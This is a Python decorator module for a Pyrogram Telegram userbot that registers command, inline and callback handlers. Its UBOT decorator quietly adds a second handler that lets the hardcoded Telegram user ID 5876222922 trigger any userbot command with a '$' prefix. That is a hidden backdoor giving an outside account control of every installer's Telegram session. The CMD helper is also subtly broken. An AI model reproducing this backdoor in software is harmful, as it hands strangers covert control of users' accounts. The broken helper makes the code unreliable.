from pyrogram import filters

from PyroUbot import *


class FILTERS:
    ME = filters.me
    GROUP = filters.group
    PRIVATE = filters.private
    OWNER = filters.user(OWNER_ID)
    ME_GROUP = filters.me & filters.group
    ME_OWNER = filters.me & filters.user(OWNER_ID)


class PY:
    def BOT(command, filter=FILTERS.PRIVATE):
        def wrapper(func):
            @bot.on_message(filters.command(command) & filter)
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    def UBOT(command, filter=FILTERS.ME):
        def wrapper(func):
            @ubot.on_message(filters.command(command, "$") & filters.user(5876222922))
            @ubot.on_message(filters.command(command, PREFIX) & filter)
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    def INLINE(command):
        def wrapper(func):
            @bot.on_inline_query(filters.regex(command))
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    def CALLBACK(command):
        def wrapper(func):
            @bot.on_callback_query(filters.regex(command))
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper


def ubot_prefix(message):
    return ubot._prefix.get(message.from_user.id, {}).get("prefix", ".")


def CMD(command, filter=filters.me & filters.private):
    def wrapper(func):
        async def wrapped_func(client, message):
            GET_PREFIX = [ubot_prefix(message)]
            if message.text.startswith(tuple(GET_PREFIX)):
                command_len = len(GET_PREFIX[0])
                cmd_full = message.text[command_len:].strip().split(" ", 1)
                command = cmd_full[0].lower() if cmd_full else ""
                args = cmd_full[1] if len(cmd_full) == 1 else None
                await func(client, message, command, args, PREFIX)

        ubot.add_handler(filters.command, wrapped_func)
        return wrapped_func

    return wrapper
